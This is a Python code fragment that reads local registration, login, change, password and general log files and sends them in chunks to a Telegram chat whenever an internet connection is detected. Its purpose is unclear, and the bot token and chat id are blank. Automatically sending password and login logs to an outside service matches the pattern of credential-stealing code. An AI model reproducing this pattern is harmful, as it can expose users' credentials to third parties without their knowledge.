def message():
    bot_token = None
    chat_id = None
    bot = telegram.Bot(token=bot_token)
    async def send_message():
        await bot.send_message(chat_id=chat_id, text=f"Log time: {datetime.datetime.now()}")
        with open(file_log_register, 'r') as f:
            register_log = f.read()
            if len(register_log) > 4000:
                for i in range(0, len(register_log), 4000):
                    await bot.send_message(chat_id=chat_id, text=f'Register log:\n{register_log[i:i+4000]}')
            else:
                await bot.send_message(chat_id=chat_id, text=f'Register log:\n{register_log}')
        with open(file_log_login, 'r') as f:
            login_log = f.read()
            if len(login_log) > 4000:
                for i in range(0, len(login_log), 4000):
                    await bot.send_message(chat_id=chat_id, text=f'Login log:\n{login_log[i:i+4000]}')
            else:
                await bot.send_message(chat_id=chat_id, text=f'Login log:\n{login_log}')
        with open(file_log_change, 'r') as f:
            change_log = f.read()
            if len(change_log) > 4000:
                for i in range(0, len(change_log), 4000):
                    await bot.send_message(chat_id=chat_id, text=f'Change log:\n{change_log[i:i+4000]}')
            else:
                await bot.send_message(chat_id=chat_id, text=f'Change log:\n{change_log}')
        with open(file_log_pass, 'r') as f:
            pass_log = f.read()
            if len(pass_log) > 4000:
                for i in range(0, len(pass_log), 4000):
                    await bot.send_message(chat_id=chat_id, text=f'Pass log:\n{pass_log[i:i+4000]}')
            else:
                await bot.send_message(chat_id=chat_id, text=f'Pass log:\n{pass_log}')
        with open(file_log, 'r') as f:
            log_log = f.read()
            if len(log_log) > 4000:
                for i in range(0, len(log_log), 4000):
                    await bot.send_message(chat_id=chat_id, text=f'Log log:\n{log_log[i:i+4000]}')
            else:
                await bot.send_message(chat_id=chat_id, text=f'Log log:\n{log_log}')
    asyncio.run(send_message())

def check_internet_connection():
    try:
        urllib.request.urlopen('http://google.com')
        return True
    except:
        return False

def check_internet():
    if check_internet_connection():
        message()
